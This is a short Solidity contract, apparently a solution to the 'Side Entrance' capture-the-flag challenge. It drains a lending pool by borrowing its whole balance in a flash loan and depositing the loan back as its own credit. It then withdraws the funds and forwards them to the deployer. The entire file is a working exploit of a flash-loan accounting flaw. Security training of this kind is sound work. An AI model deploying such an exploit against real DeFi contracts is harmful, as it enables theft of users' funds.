// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

// import {console} from "@forge-std/console.sol";

interface IChallenge {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker {

    address attacker;
    IChallenge challenge;

    constructor(address _challenge) {
        challenge = IChallenge(_challenge);
        attacker = msg.sender;
    }

    function attack() external{
        uint256 challengeBalance = address(challenge).balance;
        challenge.flashLoan(challengeBalance);
        challenge.withdraw();
    }

    function execute() external payable {
        require (msg.sender == address(challenge), "caller must be lender pool");
        challenge.deposit{value: msg.value}();
    }

    receive() external payable {
        (bool success, ) = attacker.call{value : address(this).balance}("");
        require (success);
    }
    
}